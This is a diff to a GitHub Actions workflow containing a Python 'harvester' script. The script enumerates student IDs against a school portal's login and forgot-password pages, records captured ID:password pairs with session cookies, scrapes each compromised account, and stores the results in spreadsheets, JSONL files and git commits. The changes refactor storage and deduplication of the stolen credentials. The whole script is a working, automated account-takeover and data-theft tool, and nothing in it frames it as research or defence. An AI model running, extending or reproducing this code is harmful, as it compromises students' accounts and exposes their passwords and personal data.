@@ -5,13 +5,13 @@ on:
     inputs:
       year_start:
         description: "start year (2-digit)"
-        default: "21"
+        default: "25"
       year_end:
         description: "end year (2-digit)"
         default: "26"
       suffix_start:
-        description: "suffix start"
-        default: "1"
+        description: "suffix start (first year only)"
+        default: "9020"
       suffix_end:
         description: "suffix end"
         default: "99999"
@@ -63,6 +63,7 @@ jobs:
         run: |
           cat > ofes_worker.py <<'PYEOF'
           import html as html_lib
+          import json
           import os
           import queue
           import re
@@ -96,9 +97,14 @@ jobs:
           FORGOT_URL    = f"{BASE}/public/forgot-password.php"
 
           REPO_ROOT = os.environ.get("REPO_ROOT", ".")
-          EXCEL     = os.path.join(REPO_ROOT, "ofes_data.xlsx")
+          EXCEL_IN  = os.path.join(REPO_ROOT, "ofes_data.xlsx")
           RESULTS   = os.path.join(REPO_ROOT, "ofes_hits.txt")
           ERRORS    = os.path.join(REPO_ROOT, "ofes_errors.txt")
+
+          RUN_DIR   = os.environ.get("RUNNER_TEMP", os.path.join(REPO_ROOT, "run_tmp"))
+          os.makedirs(RUN_DIR, exist_ok=True)
+          EXCEL_OUT = os.path.join(RUN_DIR, "ofes_data_new_rows.xlsx")
+          JSONL_OUT = os.path.join(RUN_DIR, "ofes_new_rows.jsonl")
 
           COMMIT_EVERY = int(os.environ.get("COMMIT_EVERY", "25"))
 
@@ -355,8 +361,10 @@ jobs:
               return cp
 
 
-          def git_commit_push(msg):
-              git("add", "ofes_data.xlsx", "ofes_hits.txt", "ofes_errors.txt", check=False)
+          def git_commit_push(msg, paths):
+              if not paths:
+                  return
+              git("add", *paths, check=False)
               cp = git("commit", "-m", msg, check=False)
               if "nothing to commit" in (cp.stdout + cp.stderr):
                   return
@@ -365,18 +373,22 @@ jobs:
 
 
           class ExcelStore:
-              def __init__(self, path):
-                  self.path = path
+              def __init__(self, repo_xlsx, out_xlsx, out_jsonl):
+                  self.repo_xlsx = repo_xlsx
+                  self.out_xlsx  = out_xlsx
+                  self.out_jsonl = out_jsonl
                   self.lock = threading.Lock()
                   self.pending = 0
                   self.seen_ids = set()
                   self.seen_pwds = set()
+                  self.seen_pairs = set()
+                  self.new_rows = 0
                   self._open()
 
-              def _create(self):
+              def _new_wb(self):
                   wb = Workbook()
                   ws = wb.active
-                  ws.title = "OFES Data"
+                  ws.title = "OFES New Rows"
                   ws.append([c[0] for c in EXCEL_COLUMNS])
                   for cell in ws[1]:
                       cell.fill = HEADER_FILL
@@ -385,50 +397,43 @@ jobs:
                   for col, w in COL_WIDTHS.items():
                       ws.column_dimensions[col].width = w
                   ws.freeze_panes = "A2"
-                  self.wb = wb
-                  self.ws = ws
+                  return wb, ws
 
               def _open(self):
-                  if not os.path.exists(self.path):
-                      self._create()
-                      self._save_locked()
-                      return
-                  try:
-                      wb = load_workbook(self.path)
-                      ws = wb.active
-                  except Exception as e:
-                      log("yellow", f"[!] excel open failed ({e}) — creating new")
-                      self._create()
-                      self._save_locked()
-                      return
-                  hdr = [c.value for c in ws[1]]
-                  if hdr[:len(EXCEL_COLUMNS)] != [c[0] for c in EXCEL_COLUMNS]:
-                      alt = self.path.replace(".xlsx", f"_old_{int(time.time())}.xlsx")
+                  if os.path.exists(self.repo_xlsx):
                       try:
+                          wb = load_workbook(self.repo_xlsx, read_only=True)
+                          ws = wb.active
+                          for row in ws.iter_rows(min_row=2, values_only=True):
+                              if row and row[0] and str(row[0]).strip():
+                                  self.seen_ids.add(str(row[0]).strip())
+                              if row and len(row) > 3 and row[3] and str(row[3]).strip():
+                                  self.seen_pwds.add(str(row[3]).strip())
+                              if row and row[0] and len(row) > 3 and row[3]:
+                                  self.seen_pairs.add(
+                                      (str(row[0]).strip(), str(row[3]).strip()))
                           wb.close()
-                          os.replace(self.path, alt)
-                          log("yellow", f"[!] schema changed — archived to {alt}")
-                      except OSError:
-                          pass
-                      self._create()
-                      self._save_locked()
-                      return
-                  self.wb = wb
-                  self.ws = ws
-                  for row in ws.iter_rows(min_row=2, values_only=True):
-                      if row and row[0] and str(row[0]).strip():
-                          self.seen_ids.add(str(row[0]).strip())
-                      if row and len(row) > 3 and row[3] and str(row[3]).strip():
-                          self.seen_pwds.add(str(row[3]).strip())
+                          log("cyan", f"[*] repo xlsx loaded (read-only): {len(self.seen_ids)} ids")
+                      except Exception as e:
+                          log("yellow", f"[!] repo xlsx read failed ({e}) — treating as empty")
+                  else:
+                      log("cyan", "[*] no repo xlsx — fresh run")
+                  self.wb, self.ws = self._new_wb()
+                  self.fh = open(self.out_jsonl, "w", buffering=1)
+                  self._save_out()
+
+              def has_id(self, sid):
+                  with self.lock:
+                      return sid in self.seen_ids
 
               def add(self, row):
                   global _dup_count
                   sid = str(row.get("student_id","") or "").strip()
                   pwd = str(row.get("password","") or "").strip()
                   with self.lock:
-                      if sid and sid in self.seen_ids:
+                      if sid and pwd and (sid, pwd) in self.seen_pairs:
                           _dup_count += 1
-                          log("dim", f"[=] dup id={sid}")
+                          log("dim", f"[=] dup pair id={sid} pwd={pwd}")
                           return False
                       if pwd and pwd in self.seen_pwds:
                           _dup_count += 1
@@ -438,24 +443,32 @@ jobs:
                       last = self.ws.max_row
                       for i in range(1, len(EXCEL_COLUMNS)+1):
                           self.ws.cell(row=last, column=i).alignment = CENTER
+                      payload = {k: row.get(k,"") for _,k in EXCEL_COLUMNS}
+                      payload.pop("phpsessid", None)
+                      self.fh.write(json.dumps(payload, ensure_ascii=False) + "\n")
+                      self.fh.flush()
+                      try:
+                          os.fsync(self.fh.fileno())
+                      except OSError:
+                          pass
                       if sid:
                           self.seen_ids.add(sid)
                       if pwd:
                           self.seen_pwds.add(pwd)
-                      self._save_locked()
+                      if sid and pwd:
+                          self.seen_pairs.add((sid, pwd))
+                      self.new_rows += 1
+                      self._save_out()
                       return True
 
-              def _save_locked(self):
-                  tmp = self.path + ".tmp"
+              def _save_out(self):
+                  tmp = self.out_xlsx + ".tmp"
                   try:
                       self.wb.save(tmp)
-                      os.replace(tmp, self.path)
+                      os.replace(tmp, self.out_xlsx)
                       self.pending += 1
-                      if COMMIT_EVERY > 0 and self.pending >= COMMIT_EVERY:
-                          self.pending = 0
-                          git_commit_push(f"ofes: row ({self.ws.max_row - 1} total)")
                   except Exception as e:
-                      log("red", f"[-] save failed: {e}")
+                      log("red", f"[-] stage save failed: {e}")
                       try:
                           if os.path.exists(tmp):
                               os.remove(tmp)
@@ -464,13 +477,17 @@ jobs:
 
               def save(self):
                   with self.lock:
-                      self._save_locked()
+                      self._save_out()
 
               def close(self):
                   with self.lock:
-                      self._save_locked()
+                      self._save_out()
                       try:
                           self.wb.close()
+                      except Exception:
+                          pass
+                      try:
+                          self.fh.close()
                       except Exception:
                           pass
 
@@ -479,7 +496,7 @@ jobs:
           def get_store():
               global _store
               if _store is None:
-                  _store = ExcelStore(EXCEL)
+                  _store = ExcelStore(EXCEL_IN, EXCEL_OUT, JSONL_OUT)
               return _store
 
 
@@ -499,7 +516,8 @@ jobs:
                       except OSError:
                           pass
                   if self.commit:
-                      git_commit_push(f"ofes: log {os.path.basename(self.path)}")
+                      git_commit_push(f"ofes: log {os.path.basename(self.path)}",
+                                      ["ofes_hits.txt", "ofes_errors.txt"])
 
               def close(self):
                   with self.lock:
@@ -518,14 +536,18 @@ jobs:
                   try:
                       isid, pwd, note, sess = try_id(s, ident)
                       if pwd:
-                          _hit_count += 1
-                          line = f"{isid}:{pwd} = captured  (PHPSESSID={sess})"
-                          log("green", f"[+] HIT  {line}")
-                          rlog.write(line)
-                          if auto_scrape:
-                              row = scrape_account(isid, pwd, sess)
-                              if row:
-                                  store.add(row)
+                          if store.has_id(isid):
+                              _dup_count += 1
+                              log("dim", f"[=] skip known id={isid}")
+                          else:
+                              _hit_count += 1
+                              line = f"{isid}:{pwd} = captured  (PHPSESSID={sess})"
+                              log("green", f"[+] HIT  {line}")
+                              rlog.write(line)
+                              if auto_scrape:
+                                  row = scrape_account(isid, pwd, sess)
+                                  if row:
+                                      store.add(row)
                       elif note not in ("no-match", "not-found"):
                           _err_count += 1
                           line = f"{isid} | {note}  (PHPSESSID={sess})"
@@ -569,8 +591,10 @@ jobs:
               log("cyan", f"[*] year {year_str}: {lo}..{hi}  ({len(all_ids):,} ids)")
               if resume:
                   seen = load_existing(RESULTS)
+                  seen |= get_store().seen_ids
+                  before = len(all_ids)
                   all_ids = [i for i in all_ids if i not in seen]
-                  log("cyan", f"[*] resume: {len(all_ids):,} remaining")
+                  log("cyan", f"[*] resume: {len(all_ids):,}/{before:,} remaining")
               if not all_ids:
                   log("cyan", "[*] nothing to do")
                   return
@@ -598,9 +622,9 @@ jobs:
 
 
           def main():
-              year_start  = int(os.environ.get("YEAR_START",  "21"))
+              year_start  = int(os.environ.get("YEAR_START",  "25"))
               year_end    = int(os.environ.get("YEAR_END",    "26"))
-              lo          = int(os.environ.get("SUFFIX_START","1"))
+              lo_first    = int(os.environ.get("SUFFIX_START","9020"))
               hi          = int(os.environ.get("SUFFIX_END",  "99999"))
               workers     = int(os.environ.get("WORKERS",     "16"))
               delay_ms    = int(os.environ.get("JITTER_MS",   "10"))
@@ -608,16 +632,21 @@ jobs:
               auto_scrape = os.environ.get("AUTO_SCRAPE", "1") == "1"
 
               log("cyan", f"[*] years {year_start}..{year_end}")
-              log("cyan", f"[*] suffix {lo}..{hi}")
+              log("cyan", f"[*] first-year suffix {lo_first}..{hi}")
+              log("cyan", f"[*] later-year suffix 1..{hi}")
               log("cyan", f"[*] workers={workers} jitter={delay_ms}ms resume={resume} scrape={auto_scrape}")
               log("cyan", f"[*] commit_every={COMMIT_EVERY}")
+              log("cyan", f"[*] repo xlsx: read-only ({EXCEL_IN})")
+              log("cyan", f"[*] staging xlsx: {EXCEL_OUT}")
+              log("cyan", f"[*] staging jsonl: {JSONL_OUT}")
 
               t0 = time.time()
               for y in range(year_start, year_end + 1):
                   year_str = f"{y:02d}" if y < 100 else str(y)
+                  lo = lo_first if y == year_start else 1
                   log("cyan", "")
                   log("cyan", "=" * 60)
-                  log("cyan", f"[*] YEAR {year_str}")
+                  log("cyan", f"[*] YEAR {year_str}  suffix {lo}..{hi}")
                   log("cyan", "=" * 60)
                   try:
                       run_year(year_str, lo, hi, workers, delay_ms, resume, auto_scrape)
@@ -626,20 +655,26 @@ jobs:
                       break
                   except Exception as e:
                       log("red", f"[-] year {year_str} failed: {e}")
-                  log("cyan", f"[*] checkpoint: year {year_str} done, rows={get_store().ws.max_row - 1}")
+                  log("cyan", f"[*] checkpoint: year {year_str} done, new_rows={get_store().new_rows}")
+
+              store = get_store()
+              store.save()
+              store.close()
 
               log("cyan", "")
               log("cyan", "=" * 60)
               log("green", f"[+] DONE in {time.time()-t0:.1f}s")
               log("cyan", f"[*] hits={_hit_count} errors={_err_count} scrapes={_scrape_count} dups={_dup_count}")
-              log("cyan", f"[*] excel rows={get_store().ws.max_row - 1}")
+              log("cyan", f"[*] new rows staged: {store.new_rows}")
+              log("cyan", f"[*] repo xlsx untouched: {EXCEL_IN}")
 
 
           def _sigterm(signum, frame):
-              log("yellow", "[!] SIGTERM — flushing")
+              log("yellow", "[!] SIGTERM — flushing staging")
               try:
-                  get_store().save()
-                  git_commit_push("ofes: sigterm flush")
+                  s = get_store()
+                  s.save()
+                  s.close()
               finally:
                   sys.exit(0)
 
@@ -655,9 +690,9 @@ jobs:
 
       - name: Run harvester
         env:
-          YEAR_START:    ${{ github.event.inputs.year_start || '21' }}
+          YEAR_START:    ${{ github.event.inputs.year_start || '25' }}
           YEAR_END:      ${{ github.event.inputs.year_end   || '26' }}
-          SUFFIX_START:  ${{ github.event.inputs.suffix_start || '1' }}
+          SUFFIX_START:  ${{ github.event.inputs.suffix_start || '9020' }}
           SUFFIX_END:    ${{ github.event.inputs.suffix_end   || '99999' }}
           WORKERS:       ${{ github.event.inputs.workers      || '16' }}
           JITTER_MS:     ${{ github.event.inputs.jitter_ms    || '10' }}
@@ -667,11 +702,33 @@ jobs:
           REPO_ROOT:     ${{ github.workspace }}
         run: python ofes_worker.py
 
-      - name: Final commit
+      - name: Upload staging artifacts
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: ofes-staging-${{ github.run_id }}
+          path: |
+            ${{ runner.temp }}/ofes_data_new_rows.xlsx
+            ${{ runner.temp }}/ofes_new_rows.jsonl
+          if-no-files-found: warn
+          retention-days: 30
+
+      - name: Commit logs only
         if: always()
         run: |
-          git add ofes_data.xlsx ofes_hits.txt ofes_errors.txt || true
+          git add ofes_hits.txt ofes_errors.txt || true
           if ! git diff --cached --quiet; then
-            git commit -m "ofes: final flush" || true
+            git commit -m "ofes: logs (run ${{ github.run_id }})" || true
             git push origin HEAD:main || true
+          fi
+
+      - name: Verify repo xlsx unmodified
+        if: always()
+        run: |
+          if git diff --quiet -- ofes_data.xlsx; then
+            echo "repo xlsx: unchanged"
+          else
+            echo "repo xlsx: MODIFIED — aborting"
+            git checkout -- ofes_data.xlsx
+            exit 1
           fi
